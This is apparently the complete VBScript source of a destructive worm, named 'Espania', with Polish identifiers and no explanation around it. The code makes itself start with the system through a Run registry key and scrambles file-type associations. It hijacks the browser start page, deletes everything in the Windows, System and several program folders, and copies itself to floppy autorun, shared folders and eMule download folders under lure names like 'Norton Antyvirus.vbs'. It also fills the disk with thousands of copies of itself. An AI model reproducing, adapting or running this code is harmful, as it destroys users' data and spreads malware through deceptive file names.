on error resume next
dim Plik,self,WinDysk

Set Plik= CreateObject("Scripting.FileSystemObject") 

Set dirwin = Plik.GetSpecialFolder(0)
Set dirsystem = Plik.GetSpecialFolder(1)
self = WScript.ScriptFullName 
WinDysk = left(dirwin, 2)


Sub Regcreate(regkey,regvalue)
on error resume next
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub

Regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Wir",dirwin & "\" & "Espania.vbs" 

Function Infect

on error resume next

Regcreate "HKEY_CLASSES_ROOT\.exe\Content Type","image/bmp"
Regcreate "HKEY_CLASSES_ROOT\.bmp\Content Type","application/x-msdownload"

Regcreate "HKEY_CLASSES_ROOT\.jpg\Content Type","text/plain"
Regcreate "HKEY_CLASSES_ROOT\.txt\Content Type","image/jpeg"

Regcreate "HKEY_CLASSES_ROOT\.gif\Content Type","image/x-icon"
Regcreate "HKEY_CLASSES_ROOT\.ico\Content Type","image/gif"

Regcreate "HKEY_CLASSES_ROOT\.avi\Content Type","system"
Regcreate "HKEY_CLASSES_ROOT\.ocx\Content Type","video/avi"

Regcreate "HKEY_CLASSES_ROOT\.zip\Content Type","application/msword"
Regcreate "HKEY_CLASSES_ROOT\.rtf\Content Type","compressed"


Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","www.laski.pl"
elseif num = 2 then
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","www.onet.pl"
elseif num = 3 then
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","www.playboy.pl"
elseif num = 4 then
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page",dirwin & "\" & "Espania.vbs"
end if

end Function


Function Kopia

on error resume next
Plik.CopyFile self,dirwin + "\" + "Espania.vbs"

end Function


Function DeleteFile

on error resume next
Plik.DeleteFile dirwin & "\" & "*.*"
Plik.deletefile dirsystem &"\" & "*.*"
Plik.DeleteFile "*.*"
Plik.DeleteFile DirWin & "\" & "Config\*.*"

Plik.DeleteFile WinDysk & "\" & "Program Files" & "Gadu-Gadu\*.*"
Plik.DeleteFile WinDysk & "\" & "Program Files" & "Gadu-Gadu\Gadu-Gadu*.*"
Plik.DeleteFile WinDysk & "\" & "Program Files" & "Outlook Express\*.*"

Plik.DeleteFile WinDysk & "\" & "Program Files" & "Windows NT\*.*"
Plik.DeleteFile WinDysk & "\" & "Program Files" & "Messenger\*.*"
Plik.DeleteFile WinDysk & "\" & "Program Files" & "Movie Maker\*.*"

end Function

Function Rozprzestrzenianie

on error resume next
Plik.CopyFile self,"A:\Autorun.vbs"
Plik.CopyFile self,"C:\My Shared Folder\Wirus.vbs"
Plik.CopyFile self,"C:\My Shared Folder\Playboy!.vbs"
Plik.CopyFile self,"C:\My Shared Folder\Norton Antyvirus.vbs"
Plik.CopyFile self,"C:\My Shared Folder\Visual Basic.vbs"
Plik.CopyFile self,"C:\My Shared Folder\Sex!.vbs"

Plik.CopyFile self,WinDysk & "\" & "Program Files\eMule\Incoming\Wirus.vbs"
Plik.CopyFile self,WinDysk & "\" & "Program Files\eMule\Incoming\PlayBoy!.vbs"
Plik.CopyFile self,WinDysk & "\" & "Program Files\eMule\Incoming\Norton Antyvirus.vbs"
Plik.CopyFile self,WinDysk & "\" & "Program Files\eMule\Incoming\Visual Basic.vbs"
Plik.CopyFile self,WinDysk & "\" & "Program Files\eMule\Incoming\Sex!.vbs"

Plik.CopyFile self,WinDysk & "\" & "Program Files\eMule\Temp\Wirus.vbs"
Plik.CopyFile self,WinDysk & "\" & "Program Files\eMule\Incoming\PlayBoy!.vbs"
Plik.CopyFile self,WinDysk & "\" & "Program Files\eMule\Incoming\Norton Antyvirus.vbs"
Plik.CopyFile self,WinDysk & "\" & "Program Files\eMule\Incoming\Visual Basic.vbs"
Plik.CopyFile self,WinDysk & "\" & "Program Files\eMule\Incoming\Sex!.vbs"

end function

Function MasoweSkrypty

on error resume next

For X = 0 to 15000
 Plik.CopyFile self, X & "Espania.vbs"
Next

For I = 0 to 15000
 Plik.CopyFile self, dirWin & "\" & I & "Espania.vbs"
Next

For Y = 0 to 15000
 Plik.CopyFile Self, dirsystem & "\" & Y & "Espania.vbs"
next
End Function

Function Godz
for A = 0 to Hour(now) + 100
Plik.CopyFile self, A & "INI.vbs"
next

For B = 0 to Minute(now) + 100
Plik.CopyFile self, B & "INF.vbs"
next 

For C = 0 to Second(now) + 100
Plik.CopyFile self, C & "I.vbs"
next 
end function

Infect
Kopia
DeleteFile
Rozprzestrzenianie
MasoweSkrypty
Godz
